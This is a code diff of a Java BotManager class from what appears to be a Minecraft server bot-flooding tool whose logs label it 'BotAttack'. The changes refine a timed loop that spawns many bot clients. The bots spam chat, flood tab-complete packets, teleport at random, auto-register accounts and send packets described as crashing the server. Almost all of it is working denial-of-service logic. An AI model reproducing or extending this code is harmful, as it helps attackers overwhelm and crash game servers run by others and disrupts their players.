@@ -61,17 +61,22 @@ public class BotManager {
                         break;
                     case "randomTeleport":
                         int count = Integer.parseInt(_action[1]);
-                        LogUtil.doLog(0, "[DEBUG] [行动] 尝试进行随机传送: " + count + "次", "BotAttack");
-                        packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), true);
+                        if (positionList.containsKey(client)) {
+                            LogUtil.doLog(0, "[DEBUG] [行动] 尝试进行随机传送: " + count + "次", "BotAttack");
+                            packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), true);
+
+                        }
                         break;
                     case "backTeleport":
-                        LogUtil.doLog(0, "[DEBUG] [行动] 尝试回到初始位置。", "BotAttack");
-                        packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), false);
+                        if (positionList.containsKey(client)) {
+                            LogUtil.doLog(0, "[DEBUG] [行动] 尝试回到初始位置。", "BotAttack");
+                            packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), false);
+                        }
                         break;
                     case "register&Login":
                         String pwd = _action[1];
                         LogUtil.doLog(0, "[DEBUG] [行动] 尝试执行注册/登录: " + pwd, "BotAttack");
-                        doRegisterLogin(client, userName, 0, false, pwd);
+                        doRegisterLogin(client, userName, 0, pwd);
                         break;
                     case "crashPacket":
                         int count_ = Integer.parseInt(_action[1]);
@@ -105,14 +110,18 @@ public class BotManager {
             }
         }).start();
 
-        while (System.currentTimeMillis() - startTime < ConfigUtil.AttackTime * 1000) {
-            executorService_1.execute(new botCreateTask());
-            OtherUtils.doSleep(ConfigUtil.ConnectDelay);
-            new Thread(() -> {
+        new Thread(() -> {
+            while (System.currentTimeMillis() - startTime < ConfigUtil.AttackTime * 1000) {
                 for (Object client : aliveList.keySet().toArray()) {
                     executorService_2.execute(new botActivitiesTask(client, aliveList.get(client)));
                 }
-            }).start();
+                OtherUtils.doSleep(ConfigUtil.ConnectDelay);
+            }
+        }).start();
+
+        while (System.currentTimeMillis() - startTime < ConfigUtil.AttackTime * 1000) {
+            OtherUtils.doSleep(ConfigUtil.ConnectDelay);
+            executorService_1.execute(new botCreateTask());
         }
         shutdownAndAwaitTermination(executorService_2);
         shutdownAndAwaitTermination(executorService_1);
@@ -172,6 +181,7 @@ public class BotManager {
             String disconnectMsg = botHandler.getClientDisconnectMsg(client);
             executorService_1.execute(new botRejoinTask(disconnectMsg, proxy, userName, BotManager.doubleAttack)); // 重连尝试
             clientList.remove(client);
+            positionList.remove(client);
         }
     }
 
@@ -186,6 +196,11 @@ public class BotManager {
 
         @Override
         public void run() {
+            if (botHandler.hasClientFlag(client, "activity") && botHandler.getClientFlag(client,"activity").equals(true)) {
+                return;
+            }
+
+            botHandler.setClientFlag(client, "activity", true);
             for (String action : ConfigUtil.BotActions) {
                 boolean async = "async".equals(action.split("\\|")[0]);
 
@@ -198,65 +213,105 @@ public class BotManager {
                     runBotAction(client, userName, action, _action);
                 }
             }
+            botHandler.setClientFlag(client, "activity", false);
         }
     }
 
     private static void runBotAction(Object client, String userName, String action, String[] _action) {
         switch (_action[0]) {
             case "wait":
-                long waitTime = Long.parseLong(_action[1]);
-                LogUtil.doLog(0, "[" + userName + "] [行动] 等待: " + waitTime + "毫秒", "BotAttack");
-                OtherUtils.doSleep(waitTime);
+                String[] waitArgs = _action[1].split("_");
+                long waitTime = Long.parseLong(waitArgs[0]);
+                String waitFlag = waitArgs[1];
+                if (botHandler.hasClientFlag(client, waitFlag)) {
+                    if (ConfigUtil.BotActionDetails) {
+                        LogUtil.doLog(0, "[" + userName + "] [行动] 等待: " + waitTime + "毫秒", "BotAttack");
+                    }
+                    OtherUtils.doSleep(waitTime);
+                }
                 break;
             case "chatSpam":
                 String[] spamArgs = _action[1].split("_");
                 int chatCount = Integer.parseInt(spamArgs[0]);
                 long chatDelay = Long.parseLong(spamArgs[1]);
-                LogUtil.doLog(0, "[" + userName + "] [行动] 尝试向服务器发送消息: " + chatCount + "次", "BotAttack");
-                for (int i = 0; i < chatCount; i++) {
-                    OtherUtils.doSleep(chatDelay);
-                    packetHandler.sendChatPacket(client, UniverseMethods.getRandMessage(userName));
+                String chatFlag = spamArgs[2];
+                if (botHandler.hasClientFlag(client, chatFlag)) {
+                    if (ConfigUtil.BotActionDetails) {
+                        LogUtil.doLog(0, "[" + userName + "] [行动] 尝试向服务器发送消息: " + chatCount + "次", "BotAttack");
+                    }
+                    for (int i = 0; i < chatCount; i++) {
+                        OtherUtils.doSleep(chatDelay);
+                        packetHandler.sendChatPacket(client, UniverseMethods.getRandMessage(userName));
+                    }
                 }
                 break;
             case "randomTeleport":
                 String[] rndTpArgs = _action[1].split("_");
                 int rndTpCount = Integer.parseInt(rndTpArgs[0]);
                 long rndTpDelay = Integer.parseInt(rndTpArgs[1]);
-                LogUtil.doLog(0, "[" + userName + "] [行动] 尝试进行随机传送: " + rndTpCount + "次", "BotAttack");
-                for (int i = 0; i < rndTpCount; i++) {
-                    packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), true);
-                    OtherUtils.doSleep(rndTpDelay);
+                String rndTpFlag = rndTpArgs[2];
+                if (botHandler.hasClientFlag(client, rndTpFlag) && positionList.containsKey(client)) {
+                    if (ConfigUtil.BotActionDetails) {
+                        LogUtil.doLog(0, "[" + userName + "] [行动] 尝试进行随机传送: " + rndTpCount + "次", "BotAttack");
+                    }
+                    for (int i = 0; i < rndTpCount; i++) {
+                        packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), true);
+                        OtherUtils.doSleep(rndTpDelay);
+                    }
                 }
                 break;
             case "backTeleport":
-                LogUtil.doLog(0, "[" + userName + "] [行动] 尝试回到初始位置。", "BotAttack");
-                packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), false);
+                String[] bTpArgs = _action[1].split("_");
+                String bTpFlag = bTpArgs[0];
+                if (botHandler.hasClientFlag(client, bTpFlag)) {
+                    if (positionList.containsKey(client)) {
+                        if (ConfigUtil.BotActionDetails) {
+                            LogUtil.doLog(0, "[" + userName + "] [行动] 尝试回到初始位置。", "BotAttack");
+                        }
+                        packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), false);
+                    }
+                }
                 break;
             case "register&Login":
                 String[] loginArgs = _action[1].split("_");
-                String flag = loginArgs[0];
-                boolean randomPwd = Boolean.parseBoolean(loginArgs[1]);
-                String pwd = loginArgs[2];
-                if (!botHandler.hasClientFlag(client, flag)) {
-                    LogUtil.doLog(0, "[" + userName + "] [行动] 尝试执行注册/登录: " + pwd, "BotAttack");
-                    doRegisterLogin(client, userName, 0, randomPwd, pwd);
-                    botHandler.setClientFlag(client, flag);
+                boolean randomPwd = Boolean.parseBoolean(loginArgs[0]);
+                String pwd = loginArgs[1];
+                if (!botHandler.hasClientFlag(client, "login")) {
+                    if (randomPwd) {
+                        pwd = DataUtil.botRegPasswordsMap.get(userName);
+                    }
+                    if (ConfigUtil.BotActionDetails) {
+                        LogUtil.doLog(0, "[" + userName + "] [行动] 尝试执行注册/登录: " + pwd, "BotAttack");
+                    }
+                    doRegisterLogin(client, userName, 0, pwd);
                 }
                 break;
             case "crashPacket":
-                int packetCount = Integer.parseInt(_action[1]);
-                LogUtil.doLog(0, "[" + userName + "] [行动] 尝试发送崩服数据包: " + packetCount + "个", "BotAttack");
-                sendCrashPacket(client, packetCount);
+                String[] crashArgs = _action[1].split("_");
+                int packetCount = Integer.parseInt(crashArgs[0]);
+                String crashFlag = crashArgs[1];
+                if (botHandler.hasClientFlag(client, crashFlag)) {
+                    if (ConfigUtil.BotActionDetails) {
+                        LogUtil.doLog(0, "[" + userName + "] [行动] 尝试发送崩服数据包: " + packetCount + "个", "BotAttack");
+                    }
+                    sendCrashPacket(client, packetCount);
+                }
                 break;
             case "tabAttack":
                 String[] tabArgs = _action[1].split("_");
                 int tabCount = Integer.parseInt(tabArgs[0]);
                 long tabDelay = Long.parseLong(tabArgs[1]);
-                LogUtil.doLog(0, "[" + userName + "] [行动] 尝试发送命令补全数据包: " + tabCount + "个", "BotAttack");
-                for (int i = 0; i < tabCount; i++) {
-                    packetHandler.sendTabCompletePacket(client, "/");
-                    OtherUtils.doSleep(tabDelay);
+                String tabFlag = tabArgs[2];
+                if (botHandler.hasClientFlag(client, tabFlag)) {
+                    if (ConfigUtil.BotActionDetails) {
+                        LogUtil.doLog(0, "[" + userName + "] [行动] 尝试发送命令补全数据包: " + tabCount + "个", "BotAttack");
+                    }
+                    for (int i = 0; i < tabCount; i++) {
+                        packetHandler.sendTabCompletePacket(client, "/");
+                        OtherUtils.doSleep(tabDelay);
+                    }
                 }
+                break;
             default:
                 LogUtil.doLog(0, "[" + userName + "] [行动] 无法识别的action语句: " + action, "BotAttack");
         }
@@ -320,17 +375,13 @@ public class BotManager {
         }
     }
 
-    public static void doRegisterLogin(Object client, String userName, long delay, boolean randomPassword, String password) {
-        botHandler.setClientFlag(client, "login");
+    public static void doRegisterLogin(Object client, String userName, long delay, String password) {
+        botHandler.setClientFlag(client, "login", "");
         new Thread(() -> {
             for (String text : ConfigUtil.RegisterCommands) {
                 OtherUtils.doSleep(delay);
                 String cmd = text;
-                if (randomPassword) {
-                    cmd = cmd.replace("$pwd", DataUtil.botRegPasswordsMap.get(userName));
-                } else {
-                    cmd = cmd.replace("$pwd", password);
-                }
+                cmd = cmd.replace("$pwd", password);
                 cmd = cmd.replace("$userName", userName);
                 cmd = cmd.replace("$rnd", OtherUtils.getRandomString(4, 6));
                 LogUtil.doLog(0, "[" + userName + "] 注册信息已发送。", "BotAttack");
